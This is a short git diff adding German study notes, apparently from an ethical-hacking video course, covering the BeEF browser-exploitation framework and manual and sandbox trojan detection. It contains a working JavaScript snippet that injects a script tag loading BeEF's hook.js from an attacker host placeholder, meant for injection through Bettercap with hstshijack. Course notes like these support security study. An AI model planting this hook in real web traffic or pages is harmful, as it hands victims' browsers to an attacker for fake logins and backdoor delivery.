@@ -68,5 +68,33 @@ Senden der Email mit PHP.
 
 ## BeEF Framework
 
-Video 89
+Video 89 – Intro
 
+Video 90 mittels Bettercap
+
+`inject_beef.js` (YourIP ersetzen!):
+
+```javascript
+var imported = document.createElement('script');
+imported.src = 'http://YourIP:3000/hook.js';
+document.head.appendChild(imported);
+```
+
+Verwendet hstshijack
+
+Video 91 – BeFF Commands
+
+Video 92 – Fake Login
+
+Video 93 – Fake update (backdoor)
+
+
+
+## Detecting Trojans
+
+Video 94 – Manuell
+
+- div.
+- Resource Monitor
+
+Video 95 – Sandbox (hybrid-analysis.com)
